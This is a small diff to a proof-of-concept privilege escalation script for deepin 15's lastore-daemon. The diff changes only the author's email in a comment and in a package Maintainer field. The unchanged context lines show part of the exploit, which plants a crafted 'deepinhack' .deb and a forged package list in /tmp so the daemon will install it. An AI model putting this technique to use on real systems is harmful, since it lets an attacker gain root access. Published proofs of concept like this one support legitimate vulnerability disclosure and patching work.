@@ -2,7 +2,7 @@
 # encoding=utf8
 
 # privilege escalation POC for deepin 15 with lastore-daemon.
-# Copyright (C) 2016 King's Way <root#kings-way.info>
+# Copyright (C) 2016 King's Way <io[AT]stdio.io>
 
 import os
 import dbus
@@ -22,7 +22,7 @@ copyfile("./deepinhack_0.0.1_amd64.deb", "/tmp/archives/deepinhack_0.0.1_amd64.d
 lists = open("/tmp/lists/packages.deepin.com_deepin_dists_unstable_main_binary-amd64_Packages", "w")
 lists.write("Package: deepinhack\n"
             "Version: 0.0.1\n"
-            "Maintainer: King's Way <root#kings-way.info>\n"
+            "Maintainer: King's Way <io[AT]stdio.io>\n"
             "Architecture: amd64\n"
             "Size: 51122\n"
             "SHA256: 3c135fb86c3a018060b55e748ad7e12b484433f1743b704ffc14e1a32f46ad12\n"
